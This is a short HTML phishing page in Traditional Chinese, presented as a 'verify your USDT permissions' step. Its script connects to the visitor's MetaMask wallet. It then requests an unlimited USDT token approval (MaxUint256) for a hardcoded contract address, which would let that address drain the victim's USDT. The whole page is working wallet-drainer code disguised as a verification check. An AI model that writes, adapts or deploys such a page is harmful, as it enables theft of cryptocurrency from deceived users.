<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>❌ 請驗證您的 USDT 使用權限</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body { font-family: Arial; padding: 20px; background: #fff; }
    button { padding: 8px 12px; font-size: 16px; cursor: pointer; }
    .fail { color: red; }
  </style>
</head>
<body>
  <h2>🔐 請驗證您的 <b>USDT</b> 使用權限</h2>
  <p>為了完成驗證，請點擊下方按鈕進行授權操作</p>
  <button onclick="approve()">一鍵授權 USDT</button>
  <p id="status"></p>

  <script>
    const CONTRACT = "0xB72C785Bc1a80C37a12D43fc55FcF2Fe2168923e";
    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const ABI = ["function approve(address spender, uint256 value) external returns (bool)"];
    let provider, signer;

    async function approve() {
      if (!window.ethereum) return alert("請先安裝 MetaMask");
      try {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        const usdt = new ethers.Contract(USDT, ABI, signer);
        const tx = await usdt.approve(CONTRACT, ethers.constants.MaxUint256);
        document.getElementById("status").innerText = "✅ TX Hash: " + tx.hash;
      } catch (e) {
        document.getElementById("status").innerText = "❌ 授權失敗: " + e.message;
      }
    }
  </script>
</body>
</html>
